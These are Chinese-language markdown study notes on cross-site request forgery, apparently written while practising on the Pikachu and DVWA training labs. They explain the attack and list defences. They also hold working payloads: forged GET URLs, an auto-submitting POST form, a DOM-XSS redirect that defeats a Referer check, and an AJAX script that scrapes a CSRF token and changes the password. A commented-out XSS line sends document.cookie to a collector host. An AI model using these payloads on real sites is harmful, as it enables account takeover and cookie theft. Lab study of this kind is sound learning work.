# CSRF

## 描述

```bash
跨站请求伪造（Cross-site request forgery）,也被称为 one-click attack ,通常缩写为 CSRF 或者 XSRF,是一种挟制用户在当前已登录的Web应用程序上执行非 本意的操作的攻击方法。 

在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接）然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个 攻击也就完成了。

如果小黑想要想要修改lucy的个人信息，应该怎么办？

-需要有lucy的权限！
于是小黑将修改个人信息的请求伪造一下，然后引诱lucy在登录的情况下点击，攻击成功了！
http://192.168.112.200/ant/vulnerabilities/csrf/csrfget/csrf_mem_edit.php?sex=女&phonenum=13856564455&add=火星村111号
&email=lucy@pikachu.com&submit=submit


为什么小黑的攻击可以成功？
条件1：xxx购物网站没有对个人信息修改的请求进行防CSRF处理，导致该请求容易被伪造。
因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。

条件2：lucy在登录了后台的情况下，点击了小黑发送的“埋伏”链接。
如果lucy不在登录状态下，或者lucy更本就没有点击这个链接，则攻击不会成功。


如果小黑事先在xx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做：
1,欺骗lucy访问埋伏了XSS脚本（盗取cookie的脚本）的页面；
2,lucy中招，小黑盗取到到lucy的cookie；
3,小黑顺利登录到lucy的后台，小黑自己修改lucy的相关信息；
所以跟上面比一下，就可以看出CSRF与XSS的区别：
CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。
```

![image-20231009153944003](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231009153944003.png)



## CSRF利用的前提条件

```bash
从图中可以看到，要完成一次CSRF攻击，受害者必须一次完成两个步骤:
1.登录信任网站A,并在本地生成Cookie。
2.在不退出的情况下，访问危险网站B。

如果不满足以上两个条件中的一个，就不会受到CSRF的攻击。
```



## 如何确认一个web系统存在CSRF漏洞

```bash
1、对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造：

比如修密码时，并不需要验证旧密码，导致请求容易被伪造；
比如对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；

2、确认凭证的有效期（这个问题会提高CSRF被利用的概率）

虽然退出或者关闭了浏览器，但cookie仍然有效，或者session并没有及时过期，导致CSRF攻击变的简单

```



![image-20231009190646385](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231009190646385.png)



### pikachu的payload

```php+HTML
http://192.168.1.187/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&phonenum=10086&add=China&email=zzp%40pikachu.com&submit=submit
```

## CSRF漏洞分类与利用

***pikachu上csrf验证***

### GET型

![image-20231009191911299](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231009191911299.png)

抓包

![image-20231009191944692](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231009191944692.png)

看到的是get提交的数据包`/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&phonenum=10086&add=China&email=zzp%40pikachu.com&submit=submit`也就是说可以这样直接伪造提交的数据包从而就该服务器内容。



发送数据包`http://192.168.1.187/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&phonenum=110&add=China&email=110%40pikachu.com&submit=submit`

![image-20231009192146459](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231009192146459.png)



### POST型

![image-20231009193258704](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231009193258704.png)

```bash
POST型,提交更改的值不会和GET型一样在地址栏了,改成在请求主体中,所以我们可以写一个钓鱼网站(from表单),from表单在写的时候,咱们写的from表单中name的值需要和后端相同,当该用户登录自己账号的时候,我们可以直接跳转并更改我们想要更改的值
```

```
from表单

用了js时间来自动点击submit

又设置了value默认值来以迅雷不及掩耳之势完成更改值

表单的提交页面需要是用户更改的那个网址

之后把到你这个页面的路径发给用户
```

```php+HTML
<!doctype html> <!-- 定义文档类型为HTML5 -->
<html lang="en"> <!-- 定义页面语言为英语 -->
<head>
    <meta charset="UTF-8"> <!-- 设置字符编码为UTF-8 -->
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <!-- 设置移动设备视口属性 -->
    <meta http-equiv="X-UA-Compatible" content="ie=edge"> <!-- 设置浏览器兼容性模式为Edge模式 -->
    <title>Document</title> <!-- 设置页面标题为"Document" -->
    <script>
        // 当页面加载完成时执行以下JavaScript代码
        window.onload = function() {
            // 通过点击具有"id"属性为"postsubmit"的按钮来提交表单
            document.getElementById("postsubmit").click();
        }
    </script>
</head>
<body>
    <form method="post" action="http://192.168.1.12/pikachu-master/vul/csrf/csrfpost/csrf_post_edit.php">
        <!-- 创建一个表单，以POST方式提交到指定URL -->
        <input  type="text" name="sex" value="boy"> <!-- 输入性别信息，默认值为"boy" -->
        <input  type="text" name="phonenum" value="10010"> <!-- 输入电话号码信息，默认值为"10010" -->
        <input  type="text" name="add" value="chain"> <!-- 输入地址信息，默认值为"chain" -->
        <input  type="text" name="email" value="zzp%40pikachu.com"> <!-- 输入电子邮件信息，默认值为"zzp%40pikachu.com" -->
        <!--
        <form method="post" action="http://192.168.1.4/pikachu/vul/xss/xsspost/xss_reflected_post.php">
            创建一个嵌套的表单，以POST方式提交到指定URL（注释掉的部分不会生效）
            <input id="xssr_in" type="text" name="message" value=
            "<script>
        document.location = 'http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
            </script>"
             /> -->
        <input id="postsubmit" type="submit" name="submit" value="submit" /> <!-- 提交按钮 -->
    </form>
</body>
</html>
```



***payload***

```bash
http://192.168.1.187/from.php
```



![image-20231009200958875](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231009200958875.png)



### token

### 防御方法

```
增加验证（常用的做法）：
1、对关键操作增加token参数，token值必须随机，每次都不一样；
2、对Referer进行验证
关于安全的会话管理（避免会话被利用）：
1、不要在客户端端保存敏感信息（比如身份认证信息）；
2、测试直接关闭，退出时，会话过期机制；
3、设置会话过期机制，比如15分钟内无操作，则自动登录超时；
访问控制安全管理：
1、敏感信息的修改时需要对身份进行二次认证，比如修改账号时，需要判断旧密码；
2、敏感信息的修改使用post，而不是get；
3、通过http 头部中的referer来限制原页面，增加验证码：一般用在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）

```



### Token是如何防止CSRF的？

```
漏洞原因：
CSRF的主要问题是敏感操作的链接容易被伪造，那么如何让这个链接不容易被伪造？
解决思路：
每次请求，都增加一个随机码（需要够随机，不容易伪造），后台每次对这个随机码进行验证！

```



### 一种有可能绕过token的情况

***如果token写在前端页面就可能会造成token可预测漏洞***

相当于token会在你修改过一次值后失效,但是会有一个新的token在你进入修改页面的时候被`隐藏域`带到前端,我只需要`在浏览器的控制台`获取新的token就能修改你的值,但是一般来说比较不现实

![image-20231009153718646](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231009153718646.png)

```
/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=boy&phonenum=10010&add=chain&email=zzp%2540pikachu.com&token=503876523f3151b5be614910479&submit=submit
```

![image-20231009203013048](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231009203013048.png)



## dvwa csrf

### low

为get类型,所以直接在地址栏更改就可以

#### payload

```
http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#
```

![image-20231009204542911](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231009204542911.png)



### medium

添加了referer认证,所以我们需要从别的页面跳转过来,让网页自带referer,所以我们选择XSS(DOM)这个页面,先写一个XSS注入,然后script中写跳转到CSRF中,我们的payload需要先完成xss注入

#### payload

```php+HTML
http://192.168.1.187/DVWA-master/vulnerabilities/xss_d/?default=</option></select><img src="x" onerror="location.href='http://192.168.1.187/DVWA-master/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#'">
```

![image-20231009210939488](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231009210939488.png)



### high

#### 思路简单的方法

添加了token认证但是token也是在前端的隐藏域,token会在更改一次密码后有一个在网页源码中

相当于token会在你修改过一次值后失效,但是会有一个新的token在你修改完成后被`隐藏域`带到前端,我只需要`在浏览器的控制台`获取新的token就能修改你的值,但是一般来说比较不现实

#### payload

```html
http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change&user_token=611850b120c6c46c0d26fc10f3514501#
```

![image-20231010094210399](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231010094210399.png)

#### 一劳永逸的方法

使用js,通过ajax来进行,需要更改里面的IP地址为你需要的IP地址

```javascript
var tokenUrl = 'http://192.168.1.187/DVWA-master/vulnerabilities/csrf/';
// 定义tokenUrl变量，指向CSRF漏洞的URL地址

if (window.XMLHttpRequest) {
    // 检查浏览器是否支持XMLHttpRequest对象
    xmlhttp = new XMLHttpRequest();
} else {
    // 如果不支持，使用ActiveXObject创建Microsoft.XMLHTTP对象（在IE浏览器中）
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
}

var count = 0;
// 初始化计数器count，用于控制请求次数

xmlhttp.withCredentials = true;
// 启用XMLHttpRequest对象的跨域请求功能

xmlhttp.onreadystatechange = function () {
    // 定义XMLHttpRequest对象的回调函数，用于处理响应数据
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
        // 检查请求状态和响应状态码是否都为成功
        var text = xmlhttp.responseText;
        // 存储响应文本

        var regex = /user_token\' value\=\'(.*?)\'\/;
        // 使用正则表达式匹配包含"user_token"值的部分
        var match = text.match(regex);
        // 执行匹配操作

        var token = match[1];
        // 从匹配结果中提取"user_token"的值

        var new_url = 'http://192.168.1.187/DVWA-master/vulnerabilities/csrf/?user_token=' + token + '&password_new=123&password_conf=123&Change=Change';
        // 构建新的URL，包括提取的"user_token"

        if (count === 0) {
            // 检查计数器是否为0，以防止多次发送请求
            count++;
            xmlhttp.open("GET", new_url, false);
            // 打开新的GET请求，将新URL传递给服务器
            xmlhttp.send();
            // 发送GET请求
        }
    }
};

xmlhttp.open("GET", tokenUrl, false);
// 打开第一个GET请求，请求CSRF漏洞页面以获取令牌
xmlhttp.send();
// 发送第一个GET请求
```

#### payload

```html
http://127.0.0.1/DVWA-master/vulnerabilities/xss_d/?default=English&a=<script src="http://192.168.1.187/ajaxtoken.js"></script>
```



## 防御

跨站请求伪造（CSRF）攻击是一种攻击类型，攻击者试图在用户不知情的情况下执行未经授权的操作。以下是一些防御CSRF攻击的关键措施：

1. 随机化和验证令牌：

   - 在每个敏感操作（如修改密码、更改电子邮件地址）上，为用户生成一个随机且唯一的令牌（CSRF令牌）。将此令牌嵌入表单或请求中，并在服务器端验证令牌的有效性。攻击者无法获取有效的令牌，因此无法执行攻击。

2. 同源策略：

   - 使用同源策略，确保网站只接受来自相同源（同一域名、协议和端口）的请求。这将阻止攻击者伪装成用户进行跨站点请求。

3. 使用Cookie属性：

   - 使用`SameSite`属性来设置Cookie，以限制Cookie在跨站请求中的发送。可以将Cookie标记为`SameSite=Strict`，以确保它仅在相同站点的请求中发送。

4. 验证HTTP Referer头：

   - 验证HTTP请求头中的Referer字段，确保请求来自合法的来源。但要注意，这种方法不是绝对可靠的，因为Referer头可能受到浏览器的限制。

5. 双重提交Cookie：

   - 在某些情况下，可以使用双重提交Cookie方法。服务器会在Cookie中设置一个令牌，并要求每个请求都包含该令牌。攻击者无法访问用户的Cookie，因此无法伪造请求。

6. 检查HTTP方法：

   - 检查HTTP请求的方法（GET、POST、PUT等）。对于敏感操作，只接受POST请求，因为GET请求可能会被攻击者利用。

7. 使用Content-Type头：

   - 检查HTTP请求的Content-Type头。确保POST请求的Content-Type为`application/x-www-form-urlencoded`或`multipart/form-data`，而不是`application/json`等，以防止CSRF攻击。

8. 避免自动登录：

   - 避免自动登录或自动执行敏感操作，特别是在用户未经明确授权的情况下。

9. 清除不再使用的会话：

   - 定期清除不再使用的用户会话，以防止攻击者获取旧的会话令牌。

10. 定期安全审计：

    - 定期进行安全审计和渗透测试，以发现和修复潜在的CSRF漏洞。

综合利用上述措施，可以显著降低CSRF攻击的风险。不同的应用和情境可能需要不同的防御方法，因此建议根据具体情况来选择和实施这些措施。



## XSS与CSRF的区别

跨站脚本（XSS）和跨站请求伪造（CSRF）是两种完全不同的网络安全威胁，它们有不同的攻击方式和目标：

1. **XSS（跨站脚本攻击）**：

   - **攻击方式**：XSS攻击是通过在网页上注入恶意脚本（通常是JavaScript代码）来攻击用户。这些脚本会在用户的浏览器中执行，以恶意方式操作网页、窃取用户信息、窃取会话令牌等。

   - **目标**：XSS攻击的目标是用户和他们的浏览器，攻击者试图利用用户的信任来执行恶意代码。

   - **防御**：防御XSS攻击的方法包括输入验证、输出编码、Content Security Policy（CSP）等，主要关注于过滤和处理用户输入以及输出到网页的内容。

2. **CSRF（跨站请求伪造攻击）**：

   - **攻击方式**：CSRF攻击是通过伪装成受信任用户的请求来攻击，以便在用户不知情的情况下执行某些操作。攻击者通常利用用户的已登录状态，发送恶意请求以执行特定的操作，如更改密码、发送资金等。

   - **目标**：CSRF攻击的目标是用户的身份验证会话。攻击者试图执行未经授权的操作，而不是注入恶意代码。

   - **防御**：防御CSRF攻击的方法包括随机化和验证令牌、同源策略、使用Cookie属性、检查HTTP Referer头等，主要关注于确保请求的合法性和来源。

总结：

- XSS攻击是关于注入恶意脚本以操纵网页内容或窃取信息，主要涉及用户界面和用户浏览器。
- CSRF攻击是关于伪装用户并执行未经授权的操作，主要涉及到后端服务器和用户的身份验证会话。
- 防御XSS和CSRF攻击需要采取不同的安全措施，针对不同的攻击方式和目标进行保护。综合使用这些措施可以提高应用程序的安全性。



## BP工具使用

先抓包到BP

![](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231010203633550.png)

再在上方面进行修改,把下面的html代码放到一个文件中,去访问就可以了

![image-20231010203644619](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231010203644619.png)







